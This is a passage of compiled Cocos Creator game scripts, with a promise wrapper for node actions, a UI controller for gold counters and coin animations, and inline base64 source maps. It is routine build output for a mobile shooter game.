YWNpdHkgPSAwO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIF9nZW5FbmVteUNvdW50ID0gMDtcclxuXHJcbiAgICAvKipcclxuICAgICAqIOWQr+WKqOaAqueJqeeUn+aIkOiuoeWIklxyXG4gICAgICovXHJcbiAgICBzdGFydEdlbmVyYXRpbmcoKXtcclxuICAgICAgICBpZiAodGhpcy5fZ2VuZXJhdGluZylyZXR1cm47XHJcbiAgICAgICAgdGhpcy5fZ2VuZXJhdGluZyA9IHRydWU7XHJcbiAgICAgICAgLy8gY29uc29sZS5sb2coR2FtZVByb3h5LmVuZW15TGlzdCwgXCJlbmVteUxpc3RcIik7XHJcbiAgICAgICAgaWYgKEdhbWVQcm94eS5raWxsQ291bnQgPCBHYW1lUHJveHkubGV2ZWxDb25maWcuYW1vdW50X3AxKXtcclxuICAgICAgICAgICAgLyoqIOesrOS4gOmYtuautSAwLjVz5Ye65LiA5Liq5oCq54mpICovXHJcbiAgICAgICAgICAgIC8qKiAwLjVz5Ye65LiA5Liq5oCq54mpICovXHJcbiAgICAgICAgICAgIGxldCBhY3Rpb24gPSBjYy5zZXF1ZW5jZShjYy5yZXBlYXQoY2Muc2VxdWVuY2UoY2MuY2FsbEZ1bmMoKCk9PnRoaXMuX2dlbkVuZW15Q291bnQgKz0gMSksIGNjLmRlbGF5VGltZSgwLjUpKSwgR2FtZVByb3h5LmxldmVsQ29uZmlnLmRlbGltaXRfcDEpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgdGhpcy5fZ2VuZXJhdGluZyA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5zdGFydENEVGFzaygpO1xyXG4gICAgICAgICAgICB9KSk7XHJcbiAgICAgICAgICAgIGFjdGlvbi5zZXRUYWcoMTAxMCk7XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oYWN0aW9uKTtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIC8qKiDnrKzkuozpmLbmrrUgMC41c+S4gOasoeWHujPkuKogKi9cclxuICAgICAgICAgICAgLyoqIDAuNXPlh7rkuIDkuKrmgKrniakgKi9cclxuICAgICAgICAgICAgbGV0IGFjdGlvbiA9IGNjLnNlcXVlbmNlKGNjLnJlcGVhdChjYy5zZXF1ZW5jZShjYy5jYWxsRnVuYygoKT0+dGhpcy5fZ2VuRW5lbXlDb3VudCArPSAxKSwgY2MuZGVsYXlUaW1lKDAuNSkpLCBNYXRoLmZsb29yKEdhbWVQcm94eS5sZXZlbENvbmZpZy5kZWxpbWl0X3AxKSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgICAgICB0aGlzLl9nZW5lcmF0aW5nID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnN0YXJ0Q0RUYXNrKCk7XHJcbiAgICAgICAgICAgIH0pKTtcclxuICAgICAgICAgICAgYWN0aW9uLnNldFRhZygxMDEwKTtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLnJ1bkFjdGlvbihhY3Rpb24pO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICB9XHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiDlgZzmraLmgKrniannlJ/miJDorqHliJJcclxuICAgICAqICovXHJcbiAgICBzdG9wR2VuZXJhdGluZygpe1xyXG4gICAgICAgIGlmICghdGhpcy5fZ2VuZXJhdGluZylyZXR1cm47XHJcbiAgICAgICAgdGhpcy5ub2RlLnN0b3BBY3Rpb25CeVRhZygxMDEwKTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog6K6h5pe25Lu75YqhICovXHJcbiAgICBzdGFydENEVGFzaygpe1xyXG4gICAgICAgIHRoaXMuc3RvcENEVGFzaygpO1xyXG4gICAgICAgIGxldCBhY3Rpb24gPSBjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUoMTApLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAvKiog55Sf5oiQ5Lik5Y+q5oCq54mpICovXHJcbiAgICAgICAgICAgIHRoaXMuX2dlbkVuZW15Q291bnQgKz0gMjtcclxuICAgICAgICAgICAgdGhpcy5zdGFydENEVGFzaygpO1xyXG4gICAgICAgIH0pKTtcclxuICAgICAgICBhY3Rpb24uc2V0VGFnKDEwNDEpO1xyXG4gICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oYWN0aW9uKTtcclxuICAgIH1cclxuXHJcbiAgICAvKiog5YGc5q2i6K6h5pe25Lu75YqhICovXHJcbiAgICBzdG9wQ0RUYXNrKCl7XHJcbiAgICAgICAgdGhpcy5ub2RlLnN0b3BBY3Rpb25CeVRhZygxMDQxKTtcclxuICAgIH1cclxuXHJcbiAgICBvbktpbGxSb2xlKCl7XHJcbiAgICAgICAgR2FtZVByb3h5LmlzT3ZlciA9IHRydWU7XHJcbiAgICAgICAgR2FtZVByb3h5LnBhdXNlR2FtZSA9IHRydWU7XHJcbiAgICAgICAgaWYgKEdhbWVQcm94eS5maXJzdEFpZEZsYWcpe1xyXG4gICAgICAgICAgICB0aGlzLnJlbGl2ZU5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICB0aGlzLnJlbGl2ZU5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICB9XHJcbiAgICAgICAgTXVzaWMucGxheVNGWChcInNvdW5kL21zY19yb2wwMDJcIik7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCJnYW1lIG92ZXI9PT7nrYnlvoXlpI3mtLtcIik7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBfcHJvcExpc3QgPSBbMSwgMiwgMywgNCwgNSwgNiwgOSwgMTEsIDEyLCAxM107XHJcbiAgICBwcml2YXRlIF9ndW5zTGlzdCA9IFtdO1xyXG5cclxuICAgIHByaXZhdGUgX2Rpc3BsYXlQcm9wTGlzdCA9IFtdO1xyXG4gICAgcHJpdmF0ZSBfZGlzcGxheUd1c0xpc3QgPSBbXTtcclxuXHJcbiAgICAvKiog5o6J5p6qICovXHJcbiAgICBwcml2YXRlIGRpc3BsYXlHdW4ocG9zaXRpb246Y2MuVmVjMil7XHJcbiAgICAgICAgbGV0IHByb3AgPSB3aW5kb3dbJ0dhbWVFbmVteXNDb250cm9sbGVyJ10uZ2V0SW5hY3RpdmVHdW4oKTtcclxuICAgICAgICBsZXQgdGVzdExpc3QgPSB0aGlzLl9ndW5zTGlzdC5maWx0ZXIodmFsdWUgPT4gIXRoaXMuX2Rpc3BsYXlHdXNMaXN0LmluY2x1ZGVzKHZhbHVlKSk7XHJcbiAgICAgICAgaWYgKHRlc3RMaXN0Lmxlbmd0aCA9PSAwKXtcclxuICAgICAgICAgICAgdGVzdExpc3QgPSB0aGlzLl9ndW5zTGlzdDtcclxuICAgICAgICAgICAgdGhpcy5fZGlzcGxheUd1c0xpc3QgPSBbXTtcclxuICAgICAgICB9XHJcbiAgICAgICAgbGV0IGlkID0gZXh0LnJhbmRvbUVsZW1lbnQodGVzdExpc3QpO1xyXG4gICAgICAgIHRoaXMuX2Rpc3BsYXlHdXNMaXN0LnB1c2goaWQpO1xyXG4gICAgICAgIHByb3AuaW5pdChpZCArIDEwMCk7XHJcbiAgICAgICAgcHJvcC5ub2RlLnBvc2l0aW9uID0gcG9zaXRpb247XHJcbiAgICAgICAgcHJvcC5kaXNwbGF5KCk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOaOiemBk+WFtyAqL1xyXG4gICAgcHJpdmF0ZSBkaXNwbGF5UHJvcChwb3NpdGlvbjpjYy5WZWMyKXtcclxuICAgICAgICBsZXQgdGVzdExpc3QgPSB0aGlzLl9wcm9wTGlzdC5maWx0ZXIodmFsdWUgPT4gIXRoaXMuX2Rpc3BsYXlQcm9wTGlzdC5pbmNsdWRlcyh2YWx1ZSkpO1xyXG4gICAgICAgIGlmICh0ZXN0TGlzdC5sZW5ndGggPT0gMCl7XHJcbiAgICAgICAgICAgIHRlc3RMaXN0ID0gdGhpcy5fcHJvcExpc3Q7XHJcbiAgICAgICAgICAgIHRoaXMuX2Rpc3BsYXlQcm9wTGlzdCA9IFtdO1xyXG4gICAgICAgIH1cclxuICAgICAgICBsZXQgaWQgPSBleHQucmFuZG9tRWxlbWVudCh0ZXN0TGlzdCk7XHJcbiAgICAgICAgdGhpcy5fZGlzcGxheVByb3BMaXN0LnB1c2goaWQpO1xyXG4gICAgICAgIGxldCBwcm9wID0gd2luZG93WydHYW1lRW5lbXlzQ29udHJvbGxlciddLmdldEluYWN0aXZlUHJvcChpZCk7XHJcbiAgICAgICAgcHJvcC5ub2RlLnBvc2l0aW9uID0gcG9zaXRpb247XHJcbiAgICAgICAgcHJvcC5kaXNwbGF5KCk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBfcHJlRGlzcGxheUd1biA9IGZhbHNlO1xyXG5cclxuICAgIG9uS2lsbEVuZW15KGVuZW15OkVuZW15KXtcclxuICAgICAgICBpZiAoR2FtZVByb3h5LmtpbGxDb3VudCUxMCA9PSAwKXtcclxuICAgICAgICAgICAgbGV0IHBvc2l0aW9uID0gZW5lbXkubm9kZS5wb3NpdGlvbjtcclxuICAgICAgICAgICAgaWYgKHRoaXMuX3ByZURpc3BsYXlHdW4pe1xyXG4gICAgICAgICAgICAgICAgdGhpcy5kaXNwbGF5UHJvcChwb3NpdGlvbik7XHJcbiAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgIHRoaXMuZGlzcGxheUd1bihwb3NpdGlvbik7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgdGhpcy5fcHJlRGlzcGxheUd1biA9ICF0aGlzLl9wcmVEaXNwbGF5R3VuO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgaWYgKEdhbWVQcm94eS5raWxsQ291bnQgPT0gR2FtZVByb3h5LmxldmVsQ29uZmlnLmFtb3VudF9wMSAtIDMpe1xyXG4gICAgICAgICAgICB0aGlzLmRpc3BsYXlHdW4oZW5lbXkubm9kZS5wb3NpdGlvbik7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBpZiAoR2FtZVByb3h5LmtpbGxDb3VudCArIHdpbmRvd1snR2FtZUVuZW15c0NvbnRyb2xsZXInXS5hbGxBbGl2ZUVuZW15KCkubGVuZ3RoIDwgR2FtZVByb3h5LmxldmVsQ29uZmlnLmFtb3VudF9wMSl7XHJcbiAgICAgICAgICAgIC8v56ys5LiA6Zi25q61XHJcbiAgICAgICAgICAgIHRoaXMuX2dlbkVuZW15Q291bnQgKz0gMjtcclxuICAgICAgICAgICAgdGhpcy5zdGFydENEVGFzaygpO1xyXG4gICAgICAgIH1lbHNlIGlmIChHYW1lUHJveHkuZW5lbXlMaXN0Lmxlbmd0aCA+IDApe1xyXG4gICAgICAgICAgICAvL+esrOS6jOmYtuautVxyXG4gICAgICAgICAgICB0aGlzLl9nZW5FbmVteUNvdW50ICs9IDM7XHJcbiAgICAgICAgICAgIHRoaXMuc3RhcnRDRFRhc2soKTtcclxuICAgICAgICB9ZWxzZSBpZiAoR2FtZVByb3h5LmtpbGxDb3VudCA+PSBHYW1lUHJveHkubWF4RW5lbXlOdW0pIHtcclxuICAgICAgICAgICAgR2FtZVByb3h5LmlzT3ZlciA9IHRydWU7XHJcbiAgICAgICAgICAgIEdhbWVQcm94eS5wYXVzZUdhbWUgPSB0cnVlO1xyXG4gICAgICAgICAgICBjb25zb2xlLmxvZyhcImdhbWUgd2luLlwiKTtcclxuICAgICAgICAgICAgdGhpcy5ibG9ja05vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICB9XHJcbiAgICAgICAgaWYgKEdhbWVQcm94eS5raWxsQ291bnQgPT0gNSl7XHJcbiAgICAgICAgICAgIGlmICghV29ybGQuTXkubmV3Ymllcy5zdGF0ZShcIktpbGxGaXZlRW5lbXlcIikpe1xyXG4gICAgICAgICAgICAgICAgbGV0IG5ld2JpZU5vZGUgPSBuZXcgY2MuTm9kZSgpO1xyXG4gICAgICAgICAgICAgICAgbmV3YmllTm9kZS5uYW1lID0gXCJuZXdiaWVOb2RlXCI7XHJcbiAgICAgICAgICAgICAgICBuZXdiaWVOb2RlLnBvc2l0aW9uID0gdGhpcy5zdXBwbHlHdWlkZU5vZGUuY29udmVydFRvV29ybGRTcGFjZUFSKGNjLnYyKCkpO1xyXG4gICAgICAgICAgICAgICAgY2MuZGlyZWN0b3IuZ2V0U2NlbmUoKS5hZGRDaGlsZChuZXdiaWVOb2RlKTtcclxuICAgICAgICAgICAgICAgIC8qKiBndWlkZUNpcmNsZSAqL1xyXG4gICAgICAgICAgICAgICAgbGV0IGd1aWRlQ2lyY2xlUHJlZmFiID0gY2MubG9hZGVyLmdldFJlcyhcInByZWZhYi9ndWlkZUNpcmNsZVwiKTtcclxuICAgICAgICAgICAgICAgIGxldCBndWlkZUNpcmNsZU5vZGUgPSBjYy5pbnN0YW50aWF0ZShndWlkZUNpcmNsZVByZWZhYik7XHJcbiAgICAgICAgICAgICAgICBndWlkZUNpcmNsZU5vZGUucG9zaXRpb24gPSBjYy52MigpO1xyXG4gICAgICAgICAgICAgICAgbmV3YmllTm9kZS5hZGRDaGlsZChndWlkZUNpcmNsZU5vZGUpO1xyXG4gICAgICAgICAgICAgICAgLyoqIGd1aWRlU2tlICovXHJcbiAgICAgICAgICAgICAgICBsZXQgZ3VpZGVTa2VQcmVmYWIgPSBjYy5sb2FkZXIuZ2V0UmVzKFwicHJlZmFiL2d1aWRlU2tlXCIpO1xyXG4gICAgICAgICAgICAgICAgbGV0IGd1aWRlU2tlTm9kZSA9IGNjLmluc3RhbnRpYXRlKGd1aWRlU2tlUHJlZmFiKTtcclxuICAgICAgICAgICAgICAgIGd1aWRlU2tlTm9kZS5wb3NpdGlvbiA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgICAgICBuZXdiaWVOb2RlLmFkZENoaWxkKGd1aWRlU2tlTm9kZSk7XHJcbiAgICAgICAgICAgICAgICBHYW1lUHJveHkucGF1c2VHYW1lID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgIHRoaXMuZ3JleU5vZGUuc3RvcEFsbEFjdGlvbnMoKTtcclxuICAgICAgICAgICAgICAgIHRoaXMuZ3JleU5vZGUub3BhY2l0eSA9IDA7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG5cclxuICAgIGdlbkVuZW15KCl7XHJcbiAgICAgICAgaWYgKEdhbWVQcm94eS5lbmVteUxpc3QubGVuZ3RoIDw9IDApe1xyXG4gICAgICAgICAgICByZXR1cm47XHJcbiAgICAgICAgfVxyXG4gICAgICAgIC8qKiDliKTmlq3kuIrpmZAgKi9cclxuICAgICAgICAvKiog56ys5LiA6Zi25q61ICovXHJcbiAgICAgICAgbGV0IGFsaXZlQ291bnQgPSB3aW5kb3dbJ0dhbWVFbmVteXNDb250cm9sbGVyJ10uYWxsQWxpdmVFbmVteSgpLmxlbmd0aDtcclxuICAgICAgICBpZiAoR2FtZVByb3h5LmtpbGxDb3VudCArIGFsaXZlQ291bnQgPD0gR2FtZVByb3h5LmxldmVsQ29uZmlnLmFtb3VudF9wMSl7XHJcbiAgICAgICAgICAgICBpZiAoYWxpdmVDb3VudCA+PSBHYW1lUHJveHkubGV2ZWxDb25maWcubGltaXRfcDEpe1xyXG4gICAgICAgICAgICAgICAgIHJldHVybjtcclxuICAgICAgICAgICAgIH1cclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIGlmIChhbGl2ZUNvdW50ID49IEdhbWVQcm94eS5sZXZlbENvbmZpZy5saW1pdF9wMil7XHJcbiAgICAgICAgICAgICAgICByZXR1cm47XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgd2luZG93WydHYW1lRW5lbXlzQ29udHJvbGxlciddLmNyZWF0ZUVuZW15KEdhbWVQcm94eS5lbmVteUxpc3Quc2hpZnQoKSk7XHJcbiAgICAgICAgdGhpcy5fZ2VuRW5lbXlDb3VudC0tO1xyXG4gICAgICAgIC8vIHdpbmRvd1snR2FtZUVuZW15c0NvbnRyb2xsZXInXS5jcmVhdGVFbmVteSgzKTtcclxuICAgICAgICBpZiAoR2FtZVByb3h5Lm1heEVuZW15TnVtIC0gR2FtZVByb3h5LmVuZW15TGlzdC5sZW5ndGggID09PSBHYW1lUHJveHkubGV2ZWxDb25maWcuYW1vdW50X3AxKzEpe1xyXG4gICAgICAgICAgICB0aGlzLm1vcmVFbmVteVRpcHNBbmltYXRpb24ubm9kZS5vcGFjaXR5ID0gMjU1O1xyXG4gICAgICAgICAgICB0aGlzLm1vcmVFbmVteVRpcHNBbmltYXRpb24ubm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICB0aGlzLm1vcmVFbmVteVRpcHNBbmltYXRpb24ucGxheSgpO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgaWYgKEdhbWVQcm94eS5lbmVteUxpc3QubGVuZ3RoID09IEdhbWVQcm94eS5zZWNvbmRCb3NzTnVtIC0gMSl7XHJcbiAgICAgICAgICAgIHRoaXMuYm9zc1RpcHNBbmltYXRpb24ubm9kZS5vcGFjaXR5ID0gMjU1O1xyXG4gICAgICAgICAgICB0aGlzLmJvc3NUaXBzQW5pbWF0aW9uLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgdGhpcy5ib3NzVGlwc0FuaW1hdGlvbi5wbGF5KCk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIHVwZGF0ZShkdDpudW1iZXIpe1xyXG4gICAgICAgIGlmICh0aGlzLl9nZW5FbmVteUNvdW50ID4gMCl7XHJcbiAgICAgICAgICAgIHRoaXMuZ2VuRW5lbXkoKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/extend/ccnodeAwait.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '8fb7amgeJpKe4gJLebr3F9k', 'ccnodeAwait');
// framework/extend/ccnodeAwait.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
function runAction(actionOrActionArray, tag) {
    return __awaiter(this, void 0, Promise, function () {
        var self;
        return __generator(this, function (_a) {
            self = this;
            return [2 /*return*/, new Promise(function (resolve) {
                    var seq = cc.sequence(actionOrActionArray, cc.callFunc(function () {
                        resolve();
                    }));
                    if (tag) {
                        seq.setTag(tag);
                    }
                    self.runAction(seq);
                })];
        });
    });
}
function once(type, useCapture) {
    return __awaiter(this, void 0, Promise, function () {
        var self;
        return __generator(this, function (_a) {
            self = this;
            return [2 /*return*/, new Promise(function (resolve) {
                    self.once(type, function (event) {
                        resolve(event);
                    }, null, useCapture);
                })];
        });
    });
}
cc.Node.prototype.runActionAwait = runAction;
cc.Node.prototype.onceAwait = once;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZXh0ZW5kL2Njbm9kZUF3YWl0LnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBRW5HLFNBQWUsU0FBUyxDQUFFLG1CQUE4RCxFQUFFLEdBQVc7bUNBQUUsT0FBTzs7O1lBQ3RHLElBQUksR0FBWSxJQUFJLENBQUM7WUFDekIsc0JBQU8sSUFBSSxPQUFPLENBQUMsVUFBQSxPQUFPO29CQUN0QixJQUFJLEdBQUcsR0FBRyxFQUFFLENBQUMsUUFBUSxDQUFDLG1CQUFtQixFQUFFLEVBQUUsQ0FBQyxRQUFRLENBQUM7d0JBQ25ELE9BQU8sRUFBRSxDQUFDO29CQUNkLENBQUMsQ0FBQyxDQUFDLENBQUM7b0JBQ0osSUFBSSxHQUFHLEVBQUU7d0JBQ0wsR0FBRyxDQUFDLE1BQU0sQ0FBQyxHQUFHLENBQUMsQ0FBQztxQkFDbkI7b0JBQ0QsSUFBSSxDQUFDLFNBQVMsQ0FBQyxHQUFHLENBQUMsQ0FBQztnQkFDeEIsQ0FBQyxDQUFDLEVBQUM7OztDQUNOO0FBR0QsU0FBZSxJQUFJLENBQUMsSUFBWSxFQUFFLFVBQW9CO21DQUFFLE9BQU87OztZQUN2RCxJQUFJLEdBQVksSUFBSSxDQUFDO1lBQ3pCLHNCQUFPLElBQUksT0FBTyxDQUFDLFVBQUEsT0FBTztvQkFDdEIsSUFBSSxDQUFDLElBQUksQ0FBQyxJQUFJLEVBQUUsVUFBVSxLQUFLO3dCQUMzQixPQUFPLENBQUMsS0FBSyxDQUFDLENBQUM7b0JBQ25CLENBQUMsRUFBRSxJQUFJLEVBQUUsVUFBVSxDQUFDLENBQUM7Z0JBQ3pCLENBQUMsQ0FBQyxFQUFDOzs7Q0FDTjtBQUVELEVBQUUsQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLGNBQWMsR0FBRyxTQUFTLENBQUM7QUFDN0MsRUFBRSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsU0FBUyxHQUFHLElBQUksQ0FBQyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuYXN5bmMgZnVuY3Rpb24gcnVuQWN0aW9uIChhY3Rpb25PckFjdGlvbkFycmF5OiBjYy5GaW5pdGVUaW1lQWN0aW9ufGNjLkZpbml0ZVRpbWVBY3Rpb25bXSwgdGFnPzpOdW1iZXIpOlByb21pc2Uge1xyXG4gICAgbGV0IHNlbGYgPSA8Y2MuTm9kZT50aGlzO1xyXG4gICAgcmV0dXJuIG5ldyBQcm9taXNlKHJlc29sdmUgPT4ge1xyXG4gICAgICAgIGxldCBzZXEgPSBjYy5zZXF1ZW5jZShhY3Rpb25PckFjdGlvbkFycmF5LCBjYy5jYWxsRnVuYyhmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgIHJlc29sdmUoKTtcclxuICAgICAgICB9KSk7XHJcbiAgICAgICAgaWYgKHRhZykge1xyXG4gICAgICAgICAgICBzZXEuc2V0VGFnKHRhZyk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHNlbGYucnVuQWN0aW9uKHNlcSk7XHJcbiAgICB9KTtcclxufVxyXG5cclxuXHJcbmFzeW5jIGZ1bmN0aW9uIG9uY2UodHlwZTogc3RyaW5nLCB1c2VDYXB0dXJlPzogYm9vbGVhbik6UHJvbWlzZXtcclxuICAgIGxldCBzZWxmID0gPGNjLk5vZGU+dGhpcztcclxuICAgIHJldHVybiBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHtcclxuICAgICAgICBzZWxmLm9uY2UodHlwZSwgZnVuY3Rpb24gKGV2ZW50KSB7XHJcbiAgICAgICAgICAgIHJlc29sdmUoZXZlbnQpO1xyXG4gICAgICAgIH0sIG51bGwsIHVzZUNhcHR1cmUpO1xyXG4gICAgfSk7XHJcbn1cclxuXHJcbmNjLk5vZGUucHJvdG90eXBlLnJ1bkFjdGlvbkF3YWl0ID0gcnVuQWN0aW9uO1xyXG5jYy5Ob2RlLnByb3RvdHlwZS5vbmNlQXdhaXQgPSBvbmNlOyJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameUIController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'f3f85MNlcZIA6Ym+TSEYYf+', 'GameUIController');
// script/app/game/GameUIController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var GameProxy_1 = require("./GameProxy");
var Extend_1 = require("../../../framework/extend/Extend");
var Actions_1 = require("../../../framework/actions/Actions");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var GoldIconNodePos = null;
var GameUIController = /** @class */ (function (_super) {
    __extends(GameUIController, _super);
    function GameUIController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.supplyIconNode = null;
        _this.lvLabels = [];
        _this.gameProgressBar = null;
        _this.gameProgressLabel = null;
        _this.goldLabel = null;
        _this.goldIconNode = null;
        _this.goldLayer = null;
        _this.gameOverNode = null;
        return _this;
        // update (dt) {}
    }
    GameUIController.prototype.getInactiveGoldIconNode = function () {
        var node = this.goldLayer.children.find(function (value) { return value.active == false; });
        if (node == null) {
            node = cc.instantiate(this.goldIconNode);
            node.active = false;
            this.goldLayer.addChild(node);
        }
        node.opacity = 255;
        node.scale = 0.7;
        return node;
    };
    GameUIController.prototype.updateGold = function () {
        this.goldLabel.string = Extend_1.ext.shortFormat(GameProxy_1.GameProxy.goldCount);
    };
    GameUIController.prototype.onLoad = function () {
        this.node.on(GameProxy_1.GameProxy.Event.KillEnemy, this.onKillEnemy, this);
        this.node.on(GameProxy_1.GameProxy.Event.InitGame, this.onInitGame, this);
        this.node.on(GameProxy_1.GameProxy.Event.StartGame, this.onStartGame, this);
        this.supplyIconNode.runAction(cc.repeatForever(cc.sequence(cc.scaleTo(0.35, 0.91), cc.scaleTo(0.35, 1))));
    };
    GameUIController.prototype.onDestroy = function () {
        this.node.off(GameProxy_1.GameProxy.Event.KillEnemy, this.onKillEnemy, this);
        this.node.off(GameProxy_1.GameProxy.Event.InitGame, this.onInitGame, this);
        this.node.off(GameProxy_1.GameProxy.Event.StartGame, this.onStartGame, this);
    };
    GameUIController.prototype.checkWin = function () {
        if (GameProxy_1.GameProxy.isOver && GameProxy_1.GameProxy.killCount >= GameProxy_1.GameProxy.maxEnemyNum && this.goldLayer.children.every(function (value) { return value.active == false; })) {
            console.log("金币飞完了，结算");
            this.gameOverNode.active = true;
        }
    };
    GameUIController.prototype.onKillEnemy = function (enemy) {
        var _this = this;
        // console.log("======onKillEnemy====>");
        /** 分配金币 */
        var totalGold = enemy.gold * GameProxy_1.GameProxy.goldMul;
        var sigleGold = Math.floor(totalGold / enemy.goldIconFell);
        var restGold = totalGold - sigleGold * enemy.goldIconFell;
        var addFlag = false;
        var moveSpeed = 1000;
        /** 飞金币 */
        var position = enemy.node.position.add(enemy.node.getParent().getParent().position);
